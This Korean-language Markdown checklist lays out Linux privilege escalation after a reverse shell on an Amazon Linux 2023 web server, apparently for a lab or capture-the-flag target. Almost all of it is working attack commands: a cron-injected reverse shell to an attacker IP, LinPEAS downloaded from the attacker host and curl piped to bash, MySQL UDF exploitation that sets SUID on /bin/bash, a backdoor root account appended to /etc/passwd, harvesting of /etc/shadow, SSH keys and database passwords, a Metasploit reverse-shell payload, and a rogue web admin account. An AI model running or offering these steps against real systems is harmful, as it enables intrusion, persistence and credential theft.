# 권한 상승이 막혔을 때 체크리스트

리버스 쉘은 획득했지만 권한 상승이 안 될 때 확인할 것들

## 현재 상황
- 사용자: apache
- OS: Amazon Linux 2023
- SELinux: 활성화됨
- SUID: 일반적인 것만 있음 (악용 불가)

---

## 단계별 체크리스트

### 1단계: 기본 정보 재확인

```bash
# 현재 사용자 및 그룹
whoami
id
groups

# 현재 위치
pwd
ls -la

# 쉘 안정화
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter 2번
export TERM=xterm
```

---

### 2단계: Sudo 권한 확인

```bash
# Sudo 리스트 (비밀번호 없이)
sudo -l

# 특정 파일 확인
sudo cat /etc/sudoers 2>/dev/null
sudo ls /root 2>/dev/null
```

**가능성:**
- `(ALL) NOPASSWD: /usr/bin/vim` 같은 것이 있으면 즉시 권한 상승 가능

---

### 3단계: 설정 파일에서 DB 비밀번호 찾기

```bash
# 웹 설정 파일 검색
find /var/www -name "*.php" 2>/dev/null
find /var/www -name "config*.php" -o -name "db*.php" 2>/dev/null

# DB 비밀번호 찾기
grep -r "password\|passwd" /var/www/html 2>/dev/null | grep -v ".jpg\|.png"
cat /var/www/html/www/db.php
cat /var/www/html/www/config.php

# 환경 변수
env | grep -i pass
cat /proc/*/environ 2>/dev/null | strings | grep -i pass
```

**다음 단계:**
- MySQL root 비밀번호를 찾으면:
  ```bash
  mysql -u root -p비밀번호
  ```
- MySQL UDF (User Defined Function)로 권한 상승 가능

---

### 4단계: MySQL/MariaDB 권한 상승

```bash
# MySQL 프로세스 확인
ps aux | grep mysql
ps aux | grep mariadb

# MySQL 소켓 파일 찾기
find / -name "*.sock" 2>/dev/null | grep mysql

# MySQL 연결 시도 (비밀번호 없이)
mysql -u root
mysql -u root -p''
mysql -u dbuser -p비밀번호

# MySQL UDF 권한 상승
# (MySQL에 접속 가능하면)
```

**MySQL UDF 권한 상승:**
```sql
-- 1. 플러그인 디렉토리 확인
show variables like 'plugin_dir';

-- 2. 현재 사용자 확인
select user();

-- 3. raptor_udf2.so 업로드 후
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chmod u+s /bin/bash');
```

---

### 5단계: /etc/passwd 쓰기 권한

```bash
# 쓰기 권한 확인
ls -la /etc/passwd
test -w /etc/passwd && echo "WRITABLE!" || echo "Not writable"

# 쓰기 가능하면
openssl passwd -1 -salt hacked hacked
echo 'hacked:생성된해시:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked
```

---

### 6단계: Cron Jobs / Systemd 서비스

```bash
# Cron 확인
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
crontab -l

# Root로 실행되는 스크립트 찾기
grep -r "root" /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/

# 쓰기 가능한 스크립트가 있으면
echo 'bash -i >& /dev/tcp/공격자IP/4445 0>&1' >> /path/to/cron_script.sh
```

---

### 7단계: 쓰기 가능한 중요 파일

```bash
# 쓰기 가능한 파일 찾기
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | head -50

# /etc 디렉토리
find /etc -writable 2>/dev/null

# 서비스 파일
find /etc/systemd/system -writable 2>/dev/null
find /usr/lib/systemd/system -writable 2>/dev/null
```

---

### 8단계: SSH 키 및 비밀번호 찾기

```bash
# SSH 개인키 찾기
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null

# 비밀번호 하드코딩 찾기
grep -r "password" /var/www 2>/dev/null | head -20
grep -r "PASS" /var/www 2>/dev/null | head -20

# History 파일
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# /etc/shadow 읽기 시도
cat /etc/shadow 2>/dev/null
```

---

### 9단계: 프로세스 / 포트 확인

```bash
# 실행 중인 프로세스
ps aux | grep root

# 열린 포트
netstat -tulnp
ss -tulnp

# 로컬에서만 열린 포트 (포트 포워딩 가능)
netstat -tulnp | grep 127.0.0.1
```

**예시:**
- MySQL이 127.0.0.1:3306에서만 열려있으면 로컬에서 접근 가능
- Redis 같은 서비스가 인증 없이 열려있을 수 있음

---

### 10단계: 커널 익스플로잇 (최후의 수단)

```bash
# 커널 버전 확인
uname -r
uname -a
cat /proc/version

# 검색할 CVE
# Amazon Linux 2023, Kernel 6.1.155
# - CVE-2023-XXXX 검색
# - exploit-db.com에서 검색
```

**주의:** 커널 익스플로잇은 시스템을 불안정하게 만들 수 있음

---

### 11단계: LinPEAS 실행

```bash
# 다운로드
cd /tmp
wget http://공격자IP:5000/linpeas.sh 2>/dev/null || curl -O http://공격자IP:5000/linpeas.sh

# 실행
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# 또는 직접 실행
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

---

### 12단계: 웹 애플리케이션 취약점 악용

```bash
# 파일 업로드 디렉토리
ls -la /var/www/html/uploads
ls -la /var/www/html/www/uploads

# 업로드 디렉토리에 .htaccess 쓰기 가능?
echo 'AddType application/x-httpd-php .txt' > /var/www/html/uploads/.htaccess

# PHP 설정 파일
cat /etc/php.ini 2>/dev/null
cat /etc/php.d/*.ini 2>/dev/null

# Apache 설정
cat /etc/httpd/conf/httpd.conf 2>/dev/null
cat /etc/apache2/apache2.conf 2>/dev/null
```

---

## 실전 워크플로우 (지금 해야 할 것)

```bash
# 1. Sudo 확인
sudo -l

# 2. DB 비밀번호 찾기
cat /var/www/html/www/db.php
grep -r "password" /var/www/html 2>/dev/null | head -20

# 3. MySQL 접속 시도
mysql -u root -p찾은비밀번호

# 4. /etc/passwd 쓰기 권한
ls -la /etc/passwd

# 5. SSH 키 찾기
find /var/www -name "*.pem" -o -name "id_rsa" 2>/dev/null

# 6. 프로세스 확인
ps aux | grep root | head -20

# 7. 쓰기 가능한 /etc 파일
find /etc -writable -type f 2>/dev/null

# 8. LinPEAS 실행
cd /tmp
wget http://공격자IP:5000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## MySQL UDF 권한 상승 상세 가이드

### 방법 1: lib_mysqludf_sys 사용

```bash
# 1. exploit-db에서 다운로드
searchsploit mysql udf
searchsploit -m 1518

# 2. 컴파일
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 3. 타겟에 업로드
# (웹쉘 또는 리버스 쉘 통해)

# 4. MySQL에서 실행
mysql -u root -p비밀번호

use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib64/mariadb/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

# 5. 권한 상승
select do_system('chmod u+s /bin/bash');
\q

# 6. SUID bash 실행
/bin/bash -p
whoami  # root!
```

### 방법 2: Metasploit UDF

```bash
# 로컬 (Metasploit)
msfconsole
use exploit/multi/mysql/mysql_udf_payload
set RHOST 타겟IP
set USERNAME root
set PASSWORD 찾은비밀번호
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 공격자IP
set LPORT 4445
exploit
```

---

## 대안: 웹 애플리케이션 통한 권한 상승

### 시나리오 1: DB에서 관리자 비밀번호 변경

```bash
# MySQL 접속 후
use vulnerable_sns;
show tables;
select * from users;

# 관리자 비밀번호 변경
update users set password='새비밀번호해시' where username='admin';

# 웹 로그인 → 관리 기능 → 파일 업로드 → 권한 상승
```

### 시나리오 2: 새 관리자 추가

```sql
insert into users (username, password, is_admin) values ('hacker', 'hash', 1);
```

---

## 다음 단계 우선순위

1. **sudo -l** (가장 빠름)
2. **DB 비밀번호 찾기** → MySQL UDF
3. **/etc/passwd 쓰기 권한**
4. **SSH 키 찾기**
5. **Cron jobs**
6. **LinPEAS 실행**
7. **커널 익스플로잇**

---

**작성일:** 2025-11-07
**상황:** 리버스 쉘 획득, SUID 없음, Amazon Linux 2023
